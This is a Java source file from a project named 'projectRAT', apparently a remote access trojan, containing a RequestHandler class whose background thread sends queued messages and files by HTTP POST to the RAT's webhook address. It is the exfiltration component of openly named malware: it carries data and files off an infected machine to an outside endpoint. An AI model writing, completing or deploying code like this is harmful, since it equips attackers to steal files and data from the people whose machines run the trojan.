package in.momin5.projectRAT;

import in.momin5.projectRAT.request.Request;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.entity.EntityBuilder;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.ContentType;
import org.apache.http.entity.StringEntity;
import org.apache.http.entity.mime.MultipartEntityBuilder;
import org.apache.http.entity.mime.content.FileBody;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.message.BasicNameValuePair;
import org.json.simple.JSONObject;

import java.util.ArrayDeque;
import java.util.Queue;

public class RequestHandler {

    private final Queue<Request> queue = new ArrayDeque<>();

    public RequestHandler()  {
        /*
            the queue system is by yoink, since i already included Apache Client in the loader, i didnt wanna add another HTTP client
            so i decided to rewrite it in this, this could also be done in Java 11 pretty easily, but this is 8 and its kinda messy
            in this version
         */
        new Thread(() -> {
            for(; ;) {
                try {
                    if(queue.isEmpty()) continue;
                    Thread.sleep(2000);
                    Request item = queue.poll();

                    CloseableHttpClient client = HttpClientBuilder.create().build();
                    if(item.getMessage() != null) {
                        HttpPost request = new HttpPost(ProjectRAT.webhook);
                        JSONObject json = new JSONObject();
                        json.put("content",item.getMessage());
                        StringEntity options = new StringEntity(json.toJSONString(), ContentType.APPLICATION_JSON);
                        request.setEntity(options);
                        HttpResponse response = client.execute(request);
                        System.out.println(response);
                    }
                    if(item.getFile() != null) {
                        HttpPost request = new HttpPost(ProjectRAT.webhook);

                        MultipartEntityBuilder multipartEntityBuilder = MultipartEntityBuilder
                                .create()
                                .addPart("_mom_i5n_",new FileBody(item.getFile()));

                        request.setEntity(multipartEntityBuilder.build());
                        HttpResponse response = client.execute(request);
                        System.out.println(response);
                    }
                    client.close();


                }catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    public void sendRequest(Request request) {
        new RequestHandler().queue.add(request);
    }

}
